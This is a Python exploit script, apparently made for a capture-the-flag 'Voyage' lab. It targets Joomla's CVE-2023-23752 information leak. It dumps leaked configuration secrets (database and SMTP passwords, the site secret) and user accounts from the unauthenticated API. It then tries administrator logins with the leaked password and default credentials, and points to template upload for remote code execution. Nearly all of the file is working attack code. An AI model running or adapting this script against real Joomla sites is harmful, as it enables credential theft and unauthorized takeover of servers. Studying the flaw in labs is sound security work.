#!/usr/bin/env python3
"""
Voyage helper for AttackBox
- Validate Joomla version
- Exploit CVE-2023-23752 information leak endpoints
- Extract useful secrets/credentials
- Attempt Joomla admin login with likely creds

Usage:
  python3 voyage_attackbox_runner.py --target 10.82.166.188 --attacker 10.82.123.142
"""

import argparse
import json
import re
import sys
from typing import Dict, List, Tuple, Optional

try:
    import requests
    from bs4 import BeautifulSoup
except Exception:
    print("[!] Missing dependencies. Install with:")
    print("    pip3 install requests beautifulsoup4")
    sys.exit(1)


def banner(title: str) -> None:
    print("\n" + "=" * 72)
    print(title)
    print("=" * 72)


def get_text(session: requests.Session, url: str, timeout: int = 12) -> Tuple[int, str]:
    r = session.get(url, timeout=timeout, allow_redirects=True)
    return r.status_code, r.text


def parse_joomla_version(xml_text: str) -> Optional[str]:
    m = re.search(r"<version>([^<]+)</version>", xml_text, re.IGNORECASE)
    return m.group(1).strip() if m else None


def fetch_config_pages(session: requests.Session, base: str) -> List[dict]:
    all_items: List[dict] = []
    offset = 0
    while True:
        u = f"{base}/api/index.php/v1/config/application?public=true&page%5Boffset%5D={offset}&page%5Blimit%5D=20"
        r = session.get(u, timeout=12)
        if r.status_code != 200:
            break
        try:
            obj = r.json()
        except Exception:
            break
        data = obj.get("data", [])
        if not data:
            break
        all_items.extend(data)
        offset += 20
        if offset > 500:
            break
    return all_items


def reduce_config(items: List[dict]) -> Dict[str, str]:
    out: Dict[str, str] = {}
    for item in items:
        attrs = item.get("attributes", {})
        for k, v in attrs.items():
            out[str(k)] = str(v)
    return out


def fetch_users(session: requests.Session, base: str) -> dict:
    u = f"{base}/api/index.php/v1/users?public=true&page%5Blimit%5D=200"
    r = session.get(u, timeout=12)
    if r.status_code != 200:
        return {}
    try:
        return r.json()
    except Exception:
        return {}


def try_admin_login(session: requests.Session, base: str, username: str, password: str) -> bool:
    login_url = f"{base}/administrator/"
    r = session.get(login_url, timeout=12)
    if r.status_code != 200:
        return False

    soup = BeautifulSoup(r.text, "html.parser")
    form = soup.find("form")
    if not form:
        return False

    data = {}
    for i in form.find_all("input"):
        n = i.get("name")
        v = i.get("value", "")
        if n:
            data[n] = v

    data["username"] = username
    data["passwd"] = password
    data["option"] = data.get("option", "com_login")
    data["task"] = data.get("task", "login")

    pr = session.post(
        f"{base}/administrator/index.php",
        data=data,
        timeout=12,
        allow_redirects=True,
    )

    t = pr.text.lower()
    # Heuristics for successful admin login
    if "task=logout" in t or "com_cpanel" in t or "administrator/index.php?option=com_cpanel" in t:
        return True
    return False


def main() -> None:
    ap = argparse.ArgumentParser(description="Voyage AttackBox Helper")
    ap.add_argument("--target", default="10.82.166.188", help="Target IP")
    ap.add_argument("--attacker", default="10.82.123.142", help="AttackBox IP")
    args = ap.parse_args()

    base = f"http://{args.target}"
    session = requests.Session()

    banner("1) Quick Target Check")
    try:
        code, body = get_text(session, base)
        print(f"[+] GET / -> HTTP {code}, len={len(body)}")
    except Exception as e:
        print(f"[-] Target not reachable: {e}")
        sys.exit(1)

    banner("2) Joomla Version & CVE Endpoint Validation")
    code, readme = get_text(session, f"{base}/README.txt")
    print(f"[+] /README.txt -> HTTP {code}")
    if code == 200:
        first = "\n".join(readme.splitlines()[:6])
        print(first)

    code, xml = get_text(session, f"{base}/administrator/manifests/files/joomla.xml")
    print(f"[+] /administrator/manifests/files/joomla.xml -> HTTP {code}")
    if code == 200:
        version = parse_joomla_version(xml)
        print(f"[+] Joomla version: {version if version else 'unknown'}")

    code, cfg_raw = get_text(session, f"{base}/api/index.php/v1/config/application?public=true")
    print(f"[+] /api/index.php/v1/config/application?public=true -> HTTP {code}")

    banner("3) Dump Leaked Config")
    items = fetch_config_pages(session, base)
    print(f"[+] Retrieved config items: {len(items)}")
    cfg = reduce_config(items)

    interesting_keys = [
        "host", "user", "password", "db", "dbprefix", "secret",
        "mailfrom", "smtphost", "smtpuser", "smtppass", "tmp_path", "log_path"
    ]
    for k in interesting_keys:
        if k in cfg:
            print(f"[+] {k} = {cfg[k]}")

    banner("4) Dump Leaked Users")
    users_obj = fetch_users(session, base)
    data = users_obj.get("data", []) if users_obj else []
    if not data:
        print("[-] No users leaked (or endpoint unavailable)")
    else:
        for u in data:
            a = u.get("attributes", {})
            print(f"[+] id={a.get('id')} username={a.get('username')} email={a.get('email')} groups={a.get('group_names')}")

    banner("5) Try Admin Login with Likely Credentials")
    leaked_user = cfg.get("user", "root")
    leaked_pass = cfg.get("password", "")

    candidates = []
    if leaked_pass:
        candidates.append(("root", leaked_pass))
        candidates.append(("admin", leaked_pass))
        candidates.append(("administrator", leaked_pass))
    candidates.extend([
        ("root", "root"),
        ("admin", "admin"),
        ("administrator", "admin"),
        ("root", "password"),
    ])

    login_ok = False
    for user, pwd in candidates:
        s = requests.Session()
        ok = try_admin_login(s, base, user, pwd)
        print(f"[*] {user}:{pwd} -> {'SUCCESS' if ok else 'fail'}")
        if ok:
            login_ok = True
            print(f"[+] Admin login works: {user}:{pwd}")
            print("[+] You can now use template/plugin upload path for code execution.")
            break

    banner("6) Next Action Guidance")
    if login_ok:
        print("[+] Best next step: Use admin panel RCE route (template edit/upload).")
    else:
        print("[!] Admin login not immediately reusable.")
        print("[!] Still, CVE-2023-23752 leak is confirmed and critical.")
        print("[!] Next likely pivot in this room: internal service/container stage after foothold.")

    print("\n[+] AttackBox helper finished.")


if __name__ == "__main__":
    main()
